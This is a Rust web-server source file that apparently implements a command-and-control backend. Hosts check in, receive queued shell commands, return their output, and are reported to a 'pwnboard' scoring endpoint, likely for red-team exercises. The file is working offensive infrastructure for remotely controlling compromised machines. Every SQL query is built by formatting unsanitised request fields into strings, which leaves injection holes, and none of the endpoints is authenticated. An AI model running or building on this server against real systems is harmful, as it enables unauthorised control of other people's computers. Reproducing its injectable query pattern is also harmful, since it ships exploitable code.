use actix_web::{get, post, web, App, HttpResponse, HttpServer, Responder, Result};
use mysql::{Opts, Pool};
use std::env;
use mysql::prelude::Queryable;
use serde::{Deserialize, Serialize};
use reqwest::StatusCode;
use reqwest::blocking::Client;

//Used for checkin
#[derive(Deserialize)]
struct Host {
    identifier: String,
}

//Used for command responses
#[derive(serde::Deserialize)]
struct CommandResponse {
    cmd_id: i32,
    response: String,
}

//Used for issuing commands
#[derive(serde::Deserialize)]
struct Command {
    host_id: String,
    command: String,
}

//Used for pwnboard
#[derive(Debug, Serialize, Deserialize)]
struct Payload {
    ip: String,
    application: String,
}

#[get("/fakedata")]
async fn fake_data() -> impl Responder {
    //adds some fake data to test with
    query_sql("INSERT INTO hosts (identifier, hostname, ip) VALUES ('localhost.1','localhost', '127.0.0.1');");
    query_sql("INSERT INTO hosts (identifier, hostname, ip) VALUES ('localhost.2','localhost', '127.0.0.2');");
    query_sql("SELECT issueCommand('localhost.1','ls');");
    query_sql("SELECT issueCommand('localhost.2','whoami');");
    let res = query_sql("SELECT command FROM commands;");
    HttpResponse::Ok().body(res)
}

#[get("/")]
async fn tables() -> impl Responder {
    let res = query_sql("SHOW TABLES;");
    HttpResponse::Ok().body(res)
}

#[get("/resetall")]
async fn clear_data() -> impl Responder {
    query_sql("DELETE FROM hosts;");
    query_sql("DELETE FROM commands;");
    let res = query_sql("SELECT * FROM hosts;");
    HttpResponse::Ok().body(res)
}

#[get("/hosts")]
async fn hosts_page() -> impl Responder {
    let res = query_sql("SELECT identifier FROM hosts;");
    if res == "" {
        return HttpResponse::Ok().body("No hosts found.");
    }
    HttpResponse::Ok().body(res)
}

#[post("/commands")]
async fn get_commands_for_host(id: web::Json<Host>) -> Result<HttpResponse> {
    let res = query_sql_mult(&format!("SELECT id, command FROM commands WHERE host_id = '{}' AND acknowledged = '0';", id.identifier));
    println!("Executed query: SELECT id, command FROM commands WHERE host_id = '{}' AND acknowledged = '0';", id.identifier);
    println!("Got result: {}", res);
    query_sql(&format!("UPDATE commands SET acknowledged = '1' WHERE host_id = {};", id.identifier));
    Ok(HttpResponse::Ok().body(res))
}

#[post("/response")]
async fn get_response_for_host(command_response: web::Json<CommandResponse>) -> Result<HttpResponse> {
    let res = query_sql(&format!("SELECT updateCommandResponse ({}, '{}');", command_response.cmd_id, command_response.response));
    Ok(HttpResponse::Ok().body(res))
}

#[post("/issuecommand")]
async fn issue_command(input: web::Json<Command>) -> Result<HttpResponse> {
    let res = query_sql(&format!("SELECT issueCommand('{}','{}');", input.host_id, input.command));
    Ok(HttpResponse::Ok().body(res))
}

#[post("/checkin")]
async fn check_in(input: web::Json<Host>) -> impl Responder {
    HttpResponse::Ok().body(check_in_host(&input.identifier))
}

fn check_in_host(identifier: &str) -> String {
    let res = query_sql(&format!("SELECT checkIn('{}');", identifier));
    match pwnboard_update(res.clone()) {
        Ok(_) => println!("Pwnboard updated successfully"),
        Err(e) => println!("Error updating pwnboard: {}", e),
    }
    res
}


fn pwnboard_update(identifier: String) -> Result<(), reqwest::Error>{
    let pwnboard_url = env::var("PWNBOARD_URL").expect("PWNBOARD_URL not set");
    let payload = Payload {
        ip: identifier.strip_suffix("\n").unwrap().to_owned(),
        application: "requestor".to_owned(),
    };

    let client = Client::new();
    let response = client.post(pwnboard_url)
        .header("accept", "*/*")
        .header("Content-Type", "application/json")
        .json(&payload)
        .send()?;

    match response.status() {
        StatusCode::OK => println!("Success!"),
        StatusCode::BAD_REQUEST => println!("Bad request!"),
        _ => println!("Unexpected status code: {}", response.status()),
    };

    Ok(())
}

fn query_sql(query: &str) -> String {
    // Get database URL from environment variable
    let database_url = env::var("DATABASE_URL").expect("DATABASE_URL not set");

    // Establish a database connection
    let opts = Opts::from_url(&database_url).unwrap();
    let pool = Pool::new(opts).unwrap();
    let mut conn = pool.get_conn().unwrap();

    // Make a query and get the result
    let result = conn.query_map(query, |row: mysql::Row| row.get::<String, _>(0)).unwrap();


    // Convert the result to a string
    let result_string = result.iter().fold(String::new(), |acc, x| acc + &x.clone().unwrap() + "\n");

    println!("Executed query '{}' and got result '{}'\n", query, result_string);
    result_string
}

//for two column queries
fn query_sql_mult(query: &str) -> String {
    // Get database URL from environment variable
    let database_url = env::var("DATABASE_URL").expect("DATABASE_URL not set");

    // Establish a database connection
    let opts = Opts::from_url(&database_url).unwrap();
    let pool = Pool::new(opts).unwrap();
    let mut conn = pool.get_conn().unwrap();

    // Make a query and get the result
    let result = conn.query_map(query, |row: mysql::Row| {
        let col1: String = row.get(0).unwrap();
        let col2: String = row.get(1).unwrap();
        (col1, col2)
    }).unwrap();

    // Convert the result to a string
    let result_string = result.iter()
        .fold(String::new(), |acc, (col1, col2)| acc + &format!("{} {}\n", col1, col2));

    println!("Executed query '{}' and got result '{}'\n", query, result_string);
    result_string
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    HttpServer::new(|| {
        App::new()
            .service(tables)
            .service(hosts_page)
            .service(fake_data)
            .service(
                web::scope("/hosts")
                    .service(get_commands_for_host)
                    .service(get_response_for_host)
                    .service(check_in)
            )
            .service(issue_command)
            .service(clear_data)
    })
    .bind(("0.0.0.0", 8000))?
    .run()
    .await
    //TODO implement multi-threading
    //TODO implement pwnboard integration
}
